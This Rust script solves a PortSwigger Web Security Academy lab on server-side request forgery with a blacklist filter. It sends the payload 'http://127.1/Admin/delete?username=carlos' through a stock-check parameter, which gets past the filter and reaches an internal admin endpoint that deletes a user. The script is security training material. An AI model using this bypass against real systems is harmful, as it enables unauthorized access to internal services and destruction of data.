/***************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 19/10/2023
*
* Lab: SSRF with blacklist-based filter
*
* Steps: 1. Inject payload into 'stockApi' parameter to delete carlos using SSRF
*           with input filter bypass
*        2. Check that carlos doesn't exist anymore in the admin panel
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a6d0048030c7e2381294d5400b00021.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!("{} {}", "⟪#⟫ Injection point:".blue(), "stockApi".yellow(),);

    // payload to delete carlos with input filter bypass
    let payload = "http://127.1/Admin/delete?username=carlos";

    print!(
        "{}",
        "❯ Injecting payload to delete carlos using SSRF with input filter bypass.. ".white(),
    );
    io::stdout().flush();

    // fetch the page with the injected payload
    client
        .post(format!("{url}/product/stock"))
        .form(&HashMap::from([("stockApi", payload)]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 The lab should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
